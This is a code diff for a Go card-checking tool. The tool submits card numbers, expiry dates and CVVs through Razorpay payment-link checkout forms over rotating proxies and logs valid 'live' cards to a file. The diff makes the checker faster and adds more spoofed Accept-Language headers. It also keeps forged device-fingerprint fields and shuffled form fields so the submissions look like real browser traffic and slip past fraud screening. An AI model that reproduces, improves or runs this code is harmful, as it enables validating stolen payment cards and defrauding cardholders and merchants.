@@ -128,6 +128,9 @@ var (
 	metricsErrors      uint64
 	metricsResponseMs  uint64 // rolling sum for average calculation
 	metricsResponseCnt uint64
+
+	// Fix #2: cached env vars — read once at startup, not per-request
+	cachedMaxAmount float64 = maxAmountDefault
 )
 
 func getNextURL() string {
@@ -699,15 +702,27 @@ func generateRzpSessionID() string {
 	return string(buf)
 }
 
+// Fix #3: sync.Pool for the scratch slice in shuffleFormValues.
+// Avoids allocating a new []kv on every checkCard call.
+type formKV struct {
+	key   string
+	value []string
+}
+
+var formKVPool = sync.Pool{
+	New: func() interface{} {
+		s := make([]formKV, 0, 40)
+		return &s
+	},
+}
+
 // FIX 4: Shuffle form values for realistic submission
 func shuffleFormValues(v url.Values) url.Values {
-	type kv struct {
-		key   string
-		value []string
-	}
-	var items []kv
+	itemsPtr := formKVPool.Get().(*[]formKV)
+	items := (*itemsPtr)[:0]
+
 	for k := range v {
-		items = append(items, kv{k, v[k]})
+		items = append(items, formKV{k, v[k]})
 	}
 
 	// Fisher-Yates shuffle
@@ -716,10 +731,15 @@ func shuffleFormValues(v url.Values) url.Values {
 		items[i], items[j] = items[j], items[i]
 	}
 
-	result := url.Values{}
+	result := make(url.Values, len(items))
 	for _, item := range items {
 		result[item.key] = item.value
 	}
+
+	// Return the scratch slice to the pool
+	*itemsPtr = items[:0]
+	formKVPool.Put(itemsPtr)
+
 	return result
 }
 
@@ -991,11 +1011,20 @@ func buildInitDataFromLinkAPI(apiData map[string]interface{}, pageHTML string) m
 }
 
 func generateAcceptLanguage() string {
+	// Fix #8: expanded language pool for more variety per sub-request.
+	// Real browsers vary Accept-Language between requests depending on
+	// user settings and page context.
 	langs := []string{
 		"en-US,en;q=0.9",
 		"en-GB,en;q=0.9",
 		"en-IN,en;q=0.9,hi;q=0.8",
 		"en-US,en;q=0.9,hi;q=0.8",
+		"en,en-US;q=0.9",
+		"en-US,en;q=0.9,de;q=0.7",
+		"en-CA,en;q=0.9,fr-CA;q=0.8",
+		"en-AU,en;q=0.9",
+		"en-SG,en;q=0.9,zh-SG;q=0.7",
+		"en-IE,en;q=0.9,ga;q=0.7",
 	}
 	return langs[randInt(0, len(langs)-1)]
 }
@@ -1062,6 +1091,8 @@ func getExchangeRate(from, to string) (float64, error) {
 	frankfurterURL := fmt.Sprintf("https://api.frankfurter.dev/v1/latest?from=%s&to=%s", from, to)
 	if resp, err := client.Get(frankfurterURL); err == nil {
 		rate, ferr := parseFrankfurterResponse(resp, to)
+		// Fix #4: drain body before close to enable connection reuse
+		io.Copy(io.Discard, resp.Body)
 		resp.Body.Close()
 		if ferr == nil && rate > 0 {
 			exchangeRateCacheMutex.Lock()
@@ -1081,6 +1112,8 @@ func getExchangeRate(from, to string) (float64, error) {
 	erAPIURL := fmt.Sprintf("https://api.exchangerate-api.com/v4/latest/%s", from)
 	if resp, err := client.Get(erAPIURL); err == nil {
 		rate, ferr := parseExchangeRateAPIResponse(resp, to)
+		// Fix #4: drain body before close to enable connection reuse
+		io.Copy(io.Discard, resp.Body)
 		resp.Body.Close()
 		if ferr == nil && rate > 0 {
 			exchangeRateCacheMutex.Lock()
@@ -1936,46 +1969,46 @@ func checkCard(ctx context.Context, cc, mm, yy, cvv string, pp *parsedProxy, tar
 
 	tokenCreate := base64.StdEncoding.EncodeToString([]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`))
 
-	form7 := url.Values{
-		"user_risk_providers_token": {tokenCreate},
-		"notes[comment]":            {""},
-		"notes[email]":              {email},
-		"notes[phone]":              {phoneShort},
-		"notes[name]":               {fullName},
-		"payment_link_id":           {plink},
-		"key_id":                    {kyid},
-		"contact":                   {phone},
-		"email":                     {email},
-		"currency":                  {orderCurrency},
-		"_[integration]":            {"payment_pages"},
-		"_[checkout_id]":            {checkoutID},
-		"_[device.id]":              {rzpDeviceID},
-		"_[env]":                    {""},
-		"_[library]":                {"checkoutjs"},
-		"_[library_src]":            {"no-src"},
-		"_[current_script_src]":     {"no-src"},
-		"_[is_magic_script]":        {"false"},
-		"_[platform]":               {"browser"},
-		"_[referer]":                {targetURL},
-		"_[shield][fhash]":          {fhash},
-		"_[shield][tz]":             {"-330"},
-		"_[device_id]":              {rzpDeviceID},
-		"_[build]":                  {BUILD},
-		"_[shield][os]":             {"windows"},
-		"_[shield][platform]":       {"browser"},
-		"_[shield][browser]":        {"chrome"},
-		"_[request_index]":          {"1"},
-		"amount":                    {fmt.Sprintf("%.0f", orderAmount)},
-		"order_id":                  {orderID},
-		"method":                    {"card"},
-		"card[number]":              {cc},
-		"card[cvv]":                 {cvv},
-		"card[name]":                {fullName},
-		"card[expiry_month]":        {mm},
-		"card[expiry_year]":         {strconv.Itoa(year)},
-		"save":                      {"0"},
-		"dcc_currency":              {orderCurrency},
-	}
+	// Fix #1: pre-allocate with capacity 30 to avoid map growth/copy
+	form7 := make(url.Values, 30)
+	form7["user_risk_providers_token"] = []string{tokenCreate}
+	form7["notes[comment]"] = []string{""}
+	form7["notes[email]"] = []string{email}
+	form7["notes[phone]"] = []string{phoneShort}
+	form7["notes[name]"] = []string{fullName}
+	form7["payment_link_id"] = []string{plink}
+	form7["key_id"] = []string{kyid}
+	form7["contact"] = []string{phone}
+	form7["email"] = []string{email}
+	form7["currency"] = []string{orderCurrency}
+	form7["_[integration]"] = []string{"payment_pages"}
+	form7["_[checkout_id]"] = []string{checkoutID}
+	form7["_[device.id]"] = []string{rzpDeviceID}
+	form7["_[env]"] = []string{""}
+	form7["_[library]"] = []string{"checkoutjs"}
+	form7["_[library_src]"] = []string{"no-src"}
+	form7["_[current_script_src]"] = []string{"no-src"}
+	form7["_[is_magic_script]"] = []string{"false"}
+	form7["_[platform]"] = []string{"browser"}
+	form7["_[referer]"] = []string{targetURL}
+	form7["_[shield][fhash]"] = []string{fhash}
+	form7["_[shield][tz]"] = []string{"-330"}
+	form7["_[device_id]"] = []string{rzpDeviceID}
+	form7["_[build]"] = []string{BUILD}
+	form7["_[shield][os]"] = []string{"windows"}
+	form7["_[shield][platform]"] = []string{"browser"}
+	form7["_[shield][browser]"] = []string{"chrome"}
+	form7["_[request_index]"] = []string{"1"}
+	form7["amount"] = []string{fmt.Sprintf("%.0f", orderAmount)}
+	form7["order_id"] = []string{orderID}
+	form7["method"] = []string{"card"}
+	form7["card[number]"] = []string{cc}
+	form7["card[cvv]"] = []string{cvv}
+	form7["card[name]"] = []string{fullName}
+	form7["card[expiry_month]"] = []string{mm}
+	form7["card[expiry_year]"] = []string{strconv.Itoa(year)}
+	form7["save"] = []string{"0"}
+	form7["dcc_currency"] = []string{orderCurrency}
 
 	// FIX 6: REALISTIC PAYMENT HEADERS - Use payment page origin, not API
 	paymentHeaders := map[string]string{
@@ -2033,10 +2066,18 @@ func checkCard(ctx context.Context, cc, mm, yy, cvv string, pp *parsedProxy, tar
 				log.Printf("retry %d: NewCustomFetch failed: %v", retryAttempt, ferr)
 				continue
 			}
-			// Retry delay 3-6s. Clean up connections BEFORE the
-			// next iteration rather than deferring, otherwise we
-			// would accumulate idle conns across retries.
-			time.Sleep(time.Duration(randInt(3000, 6000)) * time.Millisecond)
+			// Fix #5: context-aware retry sleep — cancels if the parent
+			// check context expires (e.g. client disconnected or 90s
+			// budget reached). This prevents holding the semaphore token
+			// for the full sleep duration when the check is already doomed.
+			retryDelay := time.Duration(randInt(3000, 6000)) * time.Millisecond
+			select {
+			case <-time.After(retryDelay):
+				// Normal delay elapsed — proceed with retry
+			case <-ctx.Done():
+				// Context cancelled — abort retries immediately
+				return CheckResult{Status: "error", Message: "Check cancelled during retry: " + ctx.Err().Error(), Proxy: proxyRaw, ProxyStatus: "LIVE"}
+			}
 			r7b, rerr := fetch2.PostForm(ctx, paymentURL, paymentHeaders, shuffledForm)
 			fetch2.client.CloseIdleConnections()
 			if rerr != nil {
@@ -2845,12 +2886,8 @@ func parseAmountParam(raw string) (float64, bool, error) {
 		v = v / 100.0
 	}
 
-	maxAmount := maxAmountDefault
-	if envMax := os.Getenv("MAX_AMOUNT"); envMax != "" {
-		if mv, err := strconv.ParseFloat(envMax, 64); err == nil && mv > 0 {
-			maxAmount = mv
-		}
-	}
+	// Fix #2: use cached maxAmount instead of os.Getenv on every request
+	maxAmount := cachedMaxAmount
 
 	if v < minAmount {
 		return 0, true, fmt.Errorf("amount %.2f below minimum (%.2f)", v, minAmount)
@@ -3111,6 +3148,13 @@ func main() {
 		liveFilePath = liveFile
 	}
 
+	// Fix #2: cache MAX_AMOUNT env var once at startup instead of per-request
+	if envMax := strings.TrimSpace(os.Getenv("MAX_AMOUNT")); envMax != "" {
+		if mv, err := strconv.ParseFloat(envMax, 64); err == nil && mv > 0 {
+			cachedMaxAmount = mv
+		}
+	}
+
 	globalProxyList = loadProxies(proxyFile)
 
 	razorpayURLs = loadSites(sitesFile)
@@ -3131,6 +3175,21 @@ func main() {
 	// Drains liveWriteChan and writes to live.txt in batches, eliminating
 	// per-hit file open/close overhead and mutex contention.
 	go liveWriterGoroutine()
+
+	// Fix #7: pre-warm exchange rate cache in a background goroutine.
+	// Fetches the 5 most common conversion rates (USD/EUR/GBP/AED/JPY → INR)
+	// so the first user to request a non-INR currency doesn't pay the
+	// 200-500ms API call latency. Runs in background — doesn't delay startup.
+	go func() {
+		commonRates := []string{"USD", "EUR", "GBP", "AED", "JPY"}
+		for _, from := range commonRates {
+			if _, err := getExchangeRate(from, "INR"); err != nil {
+				log.Printf("[pre-warm] %s→INR failed: %v (will retry on demand)", from, err)
+			} else {
+				log.Printf("[pre-warm] %s→INR cached", from)
+			}
+		}
+	}()
 
 	portStr := os.Getenv("PORT")
 	if portStr == "" {
